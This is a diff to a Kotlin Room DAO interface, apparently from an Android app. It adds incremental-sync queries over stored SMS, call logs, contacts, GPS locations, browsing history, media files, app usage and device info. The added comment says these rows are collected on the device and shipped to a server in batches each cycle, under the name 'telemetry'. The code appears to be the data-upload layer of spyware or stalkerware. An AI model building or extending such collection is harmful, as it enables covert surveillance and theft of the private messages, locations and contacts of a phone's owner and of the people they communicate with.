@@ -42,4 +42,34 @@ interface TelemetryDao {
 
     @Query("SELECT * FROM location_data ORDER BY timestamp DESC LIMIT 1")
     suspend fun getLastLocation(): LocationEntity?
+
+    // --- Incremental sync: rows inserted after a stored id cursor. ---
+    // The device collects structured telemetry (SMS, calls, contacts, GPS,
+    // browsing, media, app usage, device info) into Room. Every sync cycle the
+    // service pulls only rows newer than the last synced id per table and ships
+    // them to the server as typed batch messages; the server dedupes by content
+    // hash and caps each module collection.
+    @Query("SELECT * FROM sms_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getSmsAfter(lastId: Long, limit: Int): List<SmsEntity>
+
+    @Query("SELECT * FROM call_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getCallsAfter(lastId: Long, limit: Int): List<CallEntity>
+
+    @Query("SELECT * FROM contact_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getContactsAfter(lastId: Long, limit: Int): List<ContactEntity>
+
+    @Query("SELECT * FROM location_data WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getLocationsAfter(lastId: Long, limit: Int): List<LocationEntity>
+
+    @Query("SELECT * FROM browsing_history WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getBrowsingAfter(lastId: Long, limit: Int): List<BrowsingHistoryEntity>
+
+    @Query("SELECT * FROM media_files WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getMediaAfter(lastId: Long, limit: Int): List<MediaFileEntity>
+
+    @Query("SELECT * FROM app_usage WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getAppUsageAfter(lastId: Long, limit: Int): List<AppUsageEntity>
+
+    @Query("SELECT * FROM device_info WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
+    suspend fun getDeviceInfoAfter(lastId: Long, limit: Int): List<DeviceInfoEntity>
 }
